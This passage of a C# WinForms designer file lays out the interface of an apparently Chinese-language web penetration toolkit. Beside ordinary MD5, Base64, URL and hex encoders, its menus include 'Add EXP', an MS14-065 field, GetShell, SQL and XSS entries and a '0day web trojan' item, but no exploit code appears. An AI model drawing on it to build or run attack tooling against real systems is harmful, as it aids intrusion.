            this.复制BannerToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.复制BannerToolStripMenuItem.Text = "复制Banner";
            this.复制BannerToolStripMenuItem.Click += new System.EventHandler(this.复制BannerToolStripMenuItem_Click);
            // 
            // Btn_Submit
            // 
            this.Btn_Submit.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.Btn_Submit.Font = new System.Drawing.Font("SimSun", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.Btn_Submit.Image = ((System.Drawing.Image)(resources.GetObject("Btn_Submit.Image")));
            this.Btn_Submit.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.Btn_Submit.Location = new System.Drawing.Point(899, -1);
            this.Btn_Submit.Name = "Btn_Submit";
            this.Btn_Submit.Size = new System.Drawing.Size(75, 68);
            this.Btn_Submit.TabIndex = 45;
            this.Btn_Submit.Text = "提交";
            this.Btn_Submit.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.Btn_Submit.UseVisualStyleBackColor = true;
            this.Btn_Submit.Click += new System.EventHandler(this.Btn_Submit_Click);
            // 
            // btn_AddUpdateExp
            // 
            this.btn_AddUpdateExp.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.btn_AddUpdateExp.Image = ((System.Drawing.Image)(resources.GetObject("btn_AddUpdateExp.Image")));
            this.btn_AddUpdateExp.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.btn_AddUpdateExp.Location = new System.Drawing.Point(899, 133);
            this.btn_AddUpdateExp.Name = "btn_AddUpdateExp";
            this.btn_AddUpdateExp.Size = new System.Drawing.Size(75, 24);
            this.btn_AddUpdateExp.TabIndex = 73;
            this.btn_AddUpdateExp.Text = "添加EXP";
            this.btn_AddUpdateExp.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.btn_AddUpdateExp.UseVisualStyleBackColor = true;
            this.btn_AddUpdateExp.Click += new System.EventHandler(this.btn_AddExp_Click);
            // 
            // label16
            // 
            this.label16.AutoSize = true;
            this.label16.Location = new System.Drawing.Point(24, 114);
            this.label16.Name = "label16";
            this.label16.Size = new System.Drawing.Size(59, 12);
            this.label16.TabIndex = 72;
            this.label16.Text = "Referer: ";
            // 
            // chk_allowRedirect
            // 
            this.chk_allowRedirect.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.chk_allowRedirect.AutoSize = true;
            this.chk_allowRedirect.Location = new System.Drawing.Point(316, 27);
            this.chk_allowRedirect.Name = "chk_allowRedirect";
            this.chk_allowRedirect.Size = new System.Drawing.Size(60, 16);
            this.chk_allowRedirect.TabIndex = 68;
            this.chk_allowRedirect.Text = "重定向";
            this.chk_allowRedirect.UseVisualStyleBackColor = true;
            // 
            // chk_Result_WebBrowser
            // 
            this.chk_Result_WebBrowser.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.chk_Result_WebBrowser.Checked = true;
            this.chk_Result_WebBrowser.CheckState = System.Windows.Forms.CheckState.Checked;
            this.chk_Result_WebBrowser.Image = ((System.Drawing.Image)(resources.GetObject("chk_Result_WebBrowser.Image")));
            this.chk_Result_WebBrowser.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.chk_Result_WebBrowser.Location = new System.Drawing.Point(827, 217);
            this.chk_Result_WebBrowser.Name = "chk_Result_WebBrowser";
            this.chk_Result_WebBrowser.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.chk_Result_WebBrowser.Size = new System.Drawing.Size(76, 22);
            this.chk_Result_WebBrowser.TabIndex = 67;
            this.chk_Result_WebBrowser.Text = "浏览器";
            this.chk_Result_WebBrowser.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.chk_Result_WebBrowser.UseVisualStyleBackColor = true;
            this.chk_Result_WebBrowser.CheckedChanged += new System.EventHandler(this.chk_Result_WebBrowser_CheckedChanged_1);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(24, 142);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(59, 12);
            this.label3.TabIndex = 56;
            this.label3.Text = "提交数据:";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(26, 28);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(41, 12);
            this.label2.TabIndex = 43;
            this.label2.Text = "方式：";
            // 
            // chk_ResultText
            // 
            this.chk_ResultText.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.chk_ResultText.Image = ((System.Drawing.Image)(resources.GetObject("chk_ResultText.Image")));
            this.chk_ResultText.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.chk_ResultText.Location = new System.Drawing.Point(909, 217);
            this.chk_ResultText.Name = "chk_ResultText";
            this.chk_ResultText.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.chk_ResultText.Size = new System.Drawing.Size(63, 22);
            this.chk_ResultText.TabIndex = 42;
            this.chk_ResultText.Text = "文本";
            this.chk_ResultText.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.chk_ResultText.UseVisualStyleBackColor = true;
            this.chk_ResultText.CheckedChanged += new System.EventHandler(this.chk_ResultText_CheckedChanged);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(26, 3);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(41, 12);
            this.label1.TabIndex = 40;
            this.label1.Text = "网址：";
            // 
            // txt_Result
            // 
            this.txt_Result.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_Result.Location = new System.Drawing.Point(7, 242);
            this.txt_Result.Multiline = true;
            this.txt_Result.Name = "txt_Result";
            this.txt_Result.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_Result.Size = new System.Drawing.Size(965, 381);
            this.txt_Result.TabIndex = 46;
            // 
            // tab_EncodeDecode
            // 
            this.tab_EncodeDecode.Controls.Add(this.lbl_OriginalLen);
            this.tab_EncodeDecode.Controls.Add(this.txt_EncodeDecodeText);
            this.tab_EncodeDecode.Controls.Add(this.txt_ms14065);
            this.tab_EncodeDecode.ImageIndex = 76;
            this.tab_EncodeDecode.Location = new System.Drawing.Point(4, 4);
            this.tab_EncodeDecode.Name = "tab_EncodeDecode";
            this.tab_EncodeDecode.Padding = new System.Windows.Forms.Padding(3);
            this.tab_EncodeDecode.Size = new System.Drawing.Size(980, 623);
            this.tab_EncodeDecode.TabIndex = 1;
            this.tab_EncodeDecode.Text = "EncodeDecode";
            this.tab_EncodeDecode.UseVisualStyleBackColor = true;
            // 
            // lbl_OriginalLen
            // 
            this.lbl_OriginalLen.AutoSize = true;
            this.lbl_OriginalLen.Location = new System.Drawing.Point(933, 609);
            this.lbl_OriginalLen.Name = "lbl_OriginalLen";
            this.lbl_OriginalLen.Size = new System.Drawing.Size(41, 12);
            this.lbl_OriginalLen.TabIndex = 69;
            this.lbl_OriginalLen.Text = "length";
            // 
            // txt_EncodeDecodeText
            // 
            this.txt_EncodeDecodeText.ContextMenuStrip = this.rm_encodeDecode;
            this.txt_EncodeDecodeText.Location = new System.Drawing.Point(0, -1);
            this.txt_EncodeDecodeText.MaxLength = 2147483647;
            this.txt_EncodeDecodeText.Multiline = true;
            this.txt_EncodeDecodeText.Name = "txt_EncodeDecodeText";
            this.txt_EncodeDecodeText.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_EncodeDecodeText.Size = new System.Drawing.Size(980, 605);
            this.txt_EncodeDecodeText.TabIndex = 114;
            this.txt_EncodeDecodeText.TextChanged += new System.EventHandler(this.txt_EncodeDecodeText_TextChanged);
            // 
            // rm_encodeDecode
            // 
            this.rm_encodeDecode.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.新建ToolStripMenuItem,
            this.保存ToolStripMenuItem,
            this.打开ToolStripMenuItem,
            this.toolStripMenuItem39,
            this.encodeToolStripMenuItem,
            this.浏览器ToolStripMenuItem,
            this.toolStripMenuItem28,
            this.剪切ToolStripMenuItem,
            this.复制ToolStripMenuItem,
            this.粘贴ToolStripMenuItem,
            this.删除ToolStripMenuItem1,
            this.全选ToolStripMenuItem,
            this.toolStripMenuItem10,
            this.转成大写ToolStripMenuItem,
            this.转成小写ToolStripMenuItem,
            this.转成半角ToolStripMenuItem,
            this.转成全角ToolStripMenuItem,
            this.转成一行ToolStripMenuItem,
            this.toolStripMenuItem11});
            this.rm_encodeDecode.Name = "rm_encodeDecode";
            this.rm_encodeDecode.Size = new System.Drawing.Size(125, 358);
            // 
            // 新建ToolStripMenuItem
            // 
            this.新建ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("新建ToolStripMenuItem.Image")));
            this.新建ToolStripMenuItem.Name = "新建ToolStripMenuItem";
            this.新建ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.新建ToolStripMenuItem.Text = "新建";
            this.新建ToolStripMenuItem.Click += new System.EventHandler(this.新建ToolStripMenuItem_Click);
            // 
            // 保存ToolStripMenuItem
            // 
            this.保存ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("保存ToolStripMenuItem.Image")));
            this.保存ToolStripMenuItem.Name = "保存ToolStripMenuItem";
            this.保存ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.保存ToolStripMenuItem.Text = "保存";
            this.保存ToolStripMenuItem.Click += new System.EventHandler(this.保存ToolStripMenuItem_Click);
            // 
            // 打开ToolStripMenuItem
            // 
            this.打开ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("打开ToolStripMenuItem.Image")));
            this.打开ToolStripMenuItem.Name = "打开ToolStripMenuItem";
            this.打开ToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.打开ToolStripMenuItem.Text = "打开";
            // 
            // toolStripMenuItem39
            // 
            this.toolStripMenuItem39.Name = "toolStripMenuItem39";
            this.toolStripMenuItem39.Size = new System.Drawing.Size(121, 6);
            // 
            // encodeToolStripMenuItem
            // 
            this.encodeToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem52,
            this.mD5SHA1ToolStripMenuItem,
            this.base64encodeToolStripMenuItem,
            this.uRLencodeToolStripMenuItem,
            this.hex编码ToolStripMenuItem,
            this.aSCII码ToolStripMenuItem,
            this.sQLToolStripMenuItem,
            this.xSSToolStripMenuItem,
            this.http提交ToolStripMenuItem,
            this.binFileToolStripMenuItem,
            this.coderToolStripMenuItem,
            this.toolStripMenuItem50,
            this.进制转换ToolStripMenuItem,
            this.bat批处理ToolStripMenuItem,
            this.toolStripMenuItem61,
            this.getShellToolStripMenuItem,
            this.day网马ToolStripMenuItem,
            this.toolStripMenuItem64});
            this.encodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("encodeToolStripMenuItem.Image")));
            this.encodeToolStripMenuItem.Name = "encodeToolStripMenuItem";
            this.encodeToolStripMenuItem.Size = new System.Drawing.Size(124, 22);
            this.encodeToolStripMenuItem.Text = "编码转换";
            // 
            // toolStripMenuItem52
            // 
            this.toolStripMenuItem52.Name = "toolStripMenuItem52";
            this.toolStripMenuItem52.Size = new System.Drawing.Size(127, 6);
            // 
            // mD5SHA1ToolStripMenuItem
            // 
            this.mD5SHA1ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem43,
            this.mD5加密16位ToolStripMenuItem,
            this.mD5加密32位ToolStripMenuItem,
            this.toolStripMenuItem12,
            this.sHA1加密40位ToolStripMenuItem,
            this.sHA256加密ToolStripMenuItem,
            this.sHA384加密ToolStripMenuItem,
            this.sHA512加密ToolStripMenuItem,
            this.toolStripMenuItem32,
            this.全部加密结果ToolStripMenuItem,
            this.toolStripMenuItem44,
            this.k8Md5CodeToolStripMenuItem});
            this.mD5SHA1ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("mD5SHA1ToolStripMenuItem.Image")));
            this.mD5SHA1ToolStripMenuItem.Name = "mD5SHA1ToolStripMenuItem";
            this.mD5SHA1ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.mD5SHA1ToolStripMenuItem.Text = "MD5/SHA1";
            // 
            // toolStripMenuItem43
            // 
            this.toolStripMenuItem43.Name = "toolStripMenuItem43";
            this.toolStripMenuItem43.Size = new System.Drawing.Size(151, 6);
            // 
            // mD5加密16位ToolStripMenuItem
            // 
            this.mD5加密16位ToolStripMenuItem.Name = "mD5加密16位ToolStripMenuItem";
            this.mD5加密16位ToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.mD5加密16位ToolStripMenuItem.Text = "MD5加密(16)";
            this.mD5加密16位ToolStripMenuItem.Click += new System.EventHandler(this.mD5加密16位ToolStripMenuItem_Click);
            // 
            // mD5加密32位ToolStripMenuItem
            // 
            this.mD5加密32位ToolStripMenuItem.Name = "mD5加密32位ToolStripMenuItem";
            this.mD5加密32位ToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.mD5加密32位ToolStripMenuItem.Text = "MD5加密(32)";
            this.mD5加密32位ToolStripMenuItem.Click += new System.EventHandler(this.mD5加密32位ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem12
            // 
            this.toolStripMenuItem12.Name = "toolStripMenuItem12";
            this.toolStripMenuItem12.Size = new System.Drawing.Size(151, 6);
            // 
            // sHA1加密40位ToolStripMenuItem
            // 
            this.sHA1加密40位ToolStripMenuItem.Name = "sHA1加密40位ToolStripMenuItem";
            this.sHA1加密40位ToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.sHA1加密40位ToolStripMenuItem.Text = "SHA1加密(40)";
            this.sHA1加密40位ToolStripMenuItem.Click += new System.EventHandler(this.sHA1加密40位ToolStripMenuItem_Click);
            // 
            // sHA256加密ToolStripMenuItem
            // 
            this.sHA256加密ToolStripMenuItem.Name = "sHA256加密ToolStripMenuItem";
            this.sHA256加密ToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.sHA256加密ToolStripMenuItem.Text = "SHA256加密";
            this.sHA256加密ToolStripMenuItem.Click += new System.EventHandler(this.sHA256加密ToolStripMenuItem_Click);
            // 
            // sHA384加密ToolStripMenuItem
            // 
            this.sHA384加密ToolStripMenuItem.Name = "sHA384加密ToolStripMenuItem";
            this.sHA384加密ToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.sHA384加密ToolStripMenuItem.Text = "SHA384加密";
            this.sHA384加密ToolStripMenuItem.Click += new System.EventHandler(this.sHA384加密ToolStripMenuItem_Click);
            // 
            // sHA512加密ToolStripMenuItem
            // 
            this.sHA512加密ToolStripMenuItem.Name = "sHA512加密ToolStripMenuItem";
            this.sHA512加密ToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.sHA512加密ToolStripMenuItem.Text = "SHA512加密";
            this.sHA512加密ToolStripMenuItem.Click += new System.EventHandler(this.sHA512加密ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem32
            // 
            this.toolStripMenuItem32.Name = "toolStripMenuItem32";
            this.toolStripMenuItem32.Size = new System.Drawing.Size(151, 6);
            // 
            // 全部加密结果ToolStripMenuItem
            // 
            this.全部加密结果ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("全部加密结果ToolStripMenuItem.Image")));
            this.全部加密结果ToolStripMenuItem.Name = "全部加密结果ToolStripMenuItem";
            this.全部加密结果ToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.全部加密结果ToolStripMenuItem.Text = "以上算法全使用";
            this.全部加密结果ToolStripMenuItem.Click += new System.EventHandler(this.全部加密结果ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem44
            // 
            this.toolStripMenuItem44.Name = "toolStripMenuItem44";
            this.toolStripMenuItem44.Size = new System.Drawing.Size(151, 6);
            // 
            // k8Md5CodeToolStripMenuItem
            // 
            this.k8Md5CodeToolStripMenuItem.Name = "k8Md5CodeToolStripMenuItem";
            this.k8Md5CodeToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.k8Md5CodeToolStripMenuItem.Text = "K8 Md5 Code";
            this.k8Md5CodeToolStripMenuItem.Click += new System.EventHandler(this.k8Md5CodeToolStripMenuItem_Click);
            // 
            // base64encodeToolStripMenuItem
            // 
            this.base64encodeToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem42,
            this.base64GB2312ToolStripMenuItem,
            this.base64UTF8ToolStripMenuItem,
            this.base64Unicode编码ToolStripMenuItem,
            this.以上算法全使用ToolStripMenuItem,
            this.toolStripMenuItem13,
            this.base64GB2312解码ToolStripMenuItem,
            this.base64UTF8解码ToolStripMenuItem,
            this.base64Unicode解码ToolStripMenuItem,
            this.toolStripMenuItem41});
            this.base64encodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("base64encodeToolStripMenuItem.Image")));
            this.base64encodeToolStripMenuItem.Name = "base64encodeToolStripMenuItem";
            this.base64encodeToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.base64encodeToolStripMenuItem.Text = "Base64编码";
            // 
            // toolStripMenuItem42
            // 
            this.toolStripMenuItem42.Name = "toolStripMenuItem42";
            this.toolStripMenuItem42.Size = new System.Drawing.Size(181, 6);
            // 
            // base64GB2312ToolStripMenuItem
            // 
            this.base64GB2312ToolStripMenuItem.Name = "base64GB2312ToolStripMenuItem";
            this.base64GB2312ToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.base64GB2312ToolStripMenuItem.Text = "Base64编码(GB2312)";
            this.base64GB2312ToolStripMenuItem.Click += new System.EventHandler(this.base64GB2312ToolStripMenuItem_Click);
            // 
            // base64UTF8ToolStripMenuItem
            // 
            this.base64UTF8ToolStripMenuItem.Name = "base64UTF8ToolStripMenuItem";
            this.base64UTF8ToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.base64UTF8ToolStripMenuItem.Text = "Base64编码(UTF-8)";
            this.base64UTF8ToolStripMenuItem.Click += new System.EventHandler(this.base64UTF8ToolStripMenuItem_Click);
            // 
            // base64Unicode编码ToolStripMenuItem
            // 
            this.base64Unicode编码ToolStripMenuItem.Name = "base64Unicode编码ToolStripMenuItem";
            this.base64Unicode编码ToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.base64Unicode编码ToolStripMenuItem.Text = "Base64编码(Unicode)";
            this.base64Unicode编码ToolStripMenuItem.Click += new System.EventHandler(this.base64Unicode编码ToolStripMenuItem_Click);
            // 
            // 以上算法全使用ToolStripMenuItem
            // 
            this.以上算法全使用ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("以上算法全使用ToolStripMenuItem.Image")));
            this.以上算法全使用ToolStripMenuItem.Name = "以上算法全使用ToolStripMenuItem";
            this.以上算法全使用ToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.以上算法全使用ToolStripMenuItem.Text = "以上算法全使用";
            this.以上算法全使用ToolStripMenuItem.Click += new System.EventHandler(this.以上算法全使用ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem13
            // 
            this.toolStripMenuItem13.Name = "toolStripMenuItem13";
            this.toolStripMenuItem13.Size = new System.Drawing.Size(181, 6);
            // 
            // base64GB2312解码ToolStripMenuItem
            // 
            this.base64GB2312解码ToolStripMenuItem.Name = "base64GB2312解码ToolStripMenuItem";
            this.base64GB2312解码ToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.base64GB2312解码ToolStripMenuItem.Text = "Base64解码(GB2312)";
            this.base64GB2312解码ToolStripMenuItem.Click += new System.EventHandler(this.base64GB2312解码ToolStripMenuItem_Click);
            // 
            // base64UTF8解码ToolStripMenuItem
            // 
            this.base64UTF8解码ToolStripMenuItem.Name = "base64UTF8解码ToolStripMenuItem";
            this.base64UTF8解码ToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.base64UTF8解码ToolStripMenuItem.Text = "Base64解码(UTF-8)";
            this.base64UTF8解码ToolStripMenuItem.Click += new System.EventHandler(this.base64UTF8解码ToolStripMenuItem_Click);
            // 
            // base64Unicode解码ToolStripMenuItem
            // 
            this.base64Unicode解码ToolStripMenuItem.Name = "base64Unicode解码ToolStripMenuItem";
            this.base64Unicode解码ToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.base64Unicode解码ToolStripMenuItem.Text = "Base64解码(Unicode)";
            this.base64Unicode解码ToolStripMenuItem.Click += new System.EventHandler(this.base64Unicode解码ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem41
            // 
            this.toolStripMenuItem41.Name = "toolStripMenuItem41";
            this.toolStripMenuItem41.Size = new System.Drawing.Size(181, 6);
            // 
            // uRLencodeToolStripMenuItem
            // 
            this.uRLencodeToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem40,
            this.uRL编码全部ToolStripMenuItem,
            this.uRL编码GBKToolStripMenuItem,
            this.uRL编码UTF8ToolStripMenuItem,
            this.uRL编码UnicodeToolStripMenuItem,
            this.以上算法全用ToolStripMenuItem,
            this.toolStripMenuItem14,
            this.uRL解码GBKToolStripMenuItem,
            this.uRL解码GBKToolStripMenuItem1,
            this.uRL解码GBKToolStripMenuItem2,
            this.toolStripMenuItem35,
            this.只有空格20ToolStripMenuItem,
            this.只有20空格ToolStripMenuItem,
            this.只有空格URL编码ToolStripMenuItem,
            this.只有加号空格ToolStripMenuItem,
            this.toolStripMenuItem49});
            this.uRLencodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("uRLencodeToolStripMenuItem.Image")));
            this.uRLencodeToolStripMenuItem.Name = "uRLencodeToolStripMenuItem";
            this.uRLencodeToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.uRLencodeToolStripMenuItem.Text = "URL编码";
            // 
            // toolStripMenuItem40
            // 
            this.toolStripMenuItem40.Name = "toolStripMenuItem40";
            this.toolStripMenuItem40.Size = new System.Drawing.Size(169, 6);
            // 
            // uRL编码全部ToolStripMenuItem
            // 
            this.uRL编码全部ToolStripMenuItem.Name = "uRL编码全部ToolStripMenuItem";
            this.uRL编码全部ToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.uRL编码全部ToolStripMenuItem.Text = "URL编码(全部)";
            this.uRL编码全部ToolStripMenuItem.Click += new System.EventHandler(this.uRL编码全部ToolStripMenuItem_Click);
            // 
            // uRL编码GBKToolStripMenuItem
            // 
            this.uRL编码GBKToolStripMenuItem.Name = "uRL编码GBKToolStripMenuItem";
            this.uRL编码GBKToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.uRL编码GBKToolStripMenuItem.Text = "URL编码(GB2312)";
            this.uRL编码GBKToolStripMenuItem.Click += new System.EventHandler(this.uRL编码GBKToolStripMenuItem_Click);
            // 
            // uRL编码UTF8ToolStripMenuItem
            // 
            this.uRL编码UTF8ToolStripMenuItem.Name = "uRL编码UTF8ToolStripMenuItem";
            this.uRL编码UTF8ToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.uRL编码UTF8ToolStripMenuItem.Text = "URL编码(UTF-8)";
            this.uRL编码UTF8ToolStripMenuItem.Click += new System.EventHandler(this.uRL编码UTF8ToolStripMenuItem_Click);
            // 
            // uRL编码UnicodeToolStripMenuItem
            // 
            this.uRL编码UnicodeToolStripMenuItem.Name = "uRL编码UnicodeToolStripMenuItem";
            this.uRL编码UnicodeToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.uRL编码UnicodeToolStripMenuItem.Text = "URL编码(Unicode)";
            this.uRL编码UnicodeToolStripMenuItem.Click += new System.EventHandler(this.uRL编码UnicodeToolStripMenuItem_Click);
            // 
            // 以上算法全用ToolStripMenuItem
            // 
            this.以上算法全用ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("以上算法全用ToolStripMenuItem.Image")));
            this.以上算法全用ToolStripMenuItem.Name = "以上算法全用ToolStripMenuItem";
            this.以上算法全用ToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.以上算法全用ToolStripMenuItem.Text = "以上算法全使用";
            this.以上算法全用ToolStripMenuItem.Click += new System.EventHandler(this.以上算法全用ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem14
            // 
            this.toolStripMenuItem14.Name = "toolStripMenuItem14";
            this.toolStripMenuItem14.Size = new System.Drawing.Size(169, 6);
            // 
            // uRL解码GBKToolStripMenuItem
            // 
            this.uRL解码GBKToolStripMenuItem.Name = "uRL解码GBKToolStripMenuItem";
            this.uRL解码GBKToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.uRL解码GBKToolStripMenuItem.Text = "URL解码(GB2312)";
            this.uRL解码GBKToolStripMenuItem.Click += new System.EventHandler(this.uRL解码GBKToolStripMenuItem_Click);
            // 
            // uRL解码GBKToolStripMenuItem1
            // 
            this.uRL解码GBKToolStripMenuItem1.Name = "uRL解码GBKToolStripMenuItem1";
            this.uRL解码GBKToolStripMenuItem1.Size = new System.Drawing.Size(172, 22);
            this.uRL解码GBKToolStripMenuItem1.Text = "URL解码(UTF-8)";
            this.uRL解码GBKToolStripMenuItem1.Click += new System.EventHandler(this.uRL解码GBKToolStripMenuItem1_Click);
            // 
            // uRL解码GBKToolStripMenuItem2
            // 
            this.uRL解码GBKToolStripMenuItem2.Name = "uRL解码GBKToolStripMenuItem2";
            this.uRL解码GBKToolStripMenuItem2.Size = new System.Drawing.Size(172, 22);
            this.uRL解码GBKToolStripMenuItem2.Text = "URL解码(Unicode)";
            this.uRL解码GBKToolStripMenuItem2.Click += new System.EventHandler(this.uRL解码GBKToolStripMenuItem2_Click);
            // 
            // toolStripMenuItem35
            // 
            this.toolStripMenuItem35.Name = "toolStripMenuItem35";
            this.toolStripMenuItem35.Size = new System.Drawing.Size(169, 6);
            // 
            // 只有空格20ToolStripMenuItem
            // 
            this.只有空格20ToolStripMenuItem.Name = "只有空格20ToolStripMenuItem";
            this.只有空格20ToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.只有空格20ToolStripMenuItem.Text = "只有 空格 → %20";
            this.只有空格20ToolStripMenuItem.Click += new System.EventHandler(this.只有空格20ToolStripMenuItem_Click);
            // 
            // 只有20空格ToolStripMenuItem
            // 
            this.只有20空格ToolStripMenuItem.Name = "只有20空格ToolStripMenuItem";
            this.只有20空格ToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.只有20空格ToolStripMenuItem.Text = "只有 %20 → 空格";
            this.只有20空格ToolStripMenuItem.Click += new System.EventHandler(this.只有20空格ToolStripMenuItem_Click);
            // 
            // 只有空格URL编码ToolStripMenuItem
            // 
            this.只有空格URL编码ToolStripMenuItem.Name = "只有空格URL编码ToolStripMenuItem";
            this.只有空格URL编码ToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.只有空格URL编码ToolStripMenuItem.Text = "只有 空格 → 加号";
            this.只有空格URL编码ToolStripMenuItem.Click += new System.EventHandler(this.只有空格URL编码ToolStripMenuItem_Click);
            // 
            // 只有加号空格ToolStripMenuItem
            // 
            this.只有加号空格ToolStripMenuItem.Name = "只有加号空格ToolStripMenuItem";
            this.只有加号空格ToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
            this.只有加号空格ToolStripMenuItem.Text = "只有 加号 → 空格";
            this.只有加号空格ToolStripMenuItem.Click += new System.EventHandler(this.只有加号空格ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem49
            // 
            this.toolStripMenuItem49.Name = "toolStripMenuItem49";
            this.toolStripMenuItem49.Size = new System.Drawing.Size(169, 6);
            // 
            // hex编码ToolStripMenuItem
            // 
            this.hex编码ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem55,
            this.hex编码ToolStripMenuItem1,
            this.hex编码UTF8ToolStripMenuItem,
            this.hex编码UnicodeToolStripMenuItem,
            this.以上算法全使用ToolStripMenuItem1,
            this.toolStripMenuItem54,
            this.hex解码ToolStripMenuItem,
            this.hex解码UTF8ToolStripMenuItem,
            this.hex解码UnicodeToolStripMenuItem,
            this.toolStripMenuItem53});
            this.hex编码ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hex编码ToolStripMenuItem.Image")));
            this.hex编码ToolStripMenuItem.Name = "hex编码ToolStripMenuItem";
            this.hex编码ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.hex编码ToolStripMenuItem.Text = "Hex编码";
            // 
            // toolStripMenuItem55
            // 
            this.toolStripMenuItem55.Name = "toolStripMenuItem55";
            this.toolStripMenuItem55.Size = new System.Drawing.Size(163, 6);
            // 
            // hex编码ToolStripMenuItem1
            // 
            this.hex编码ToolStripMenuItem1.Name = "hex编码ToolStripMenuItem1";
            this.hex编码ToolStripMenuItem1.Size = new System.Drawing.Size(166, 22);
            this.hex编码ToolStripMenuItem1.Text = "Hex编码(GB2312)";
            this.hex编码ToolStripMenuItem1.Click += new System.EventHandler(this.hex编码ToolStripMenuItem1_Click);
            // 
            // hex编码UTF8ToolStripMenuItem
            // 
            this.hex编码UTF8ToolStripMenuItem.Name = "hex编码UTF8ToolStripMenuItem";
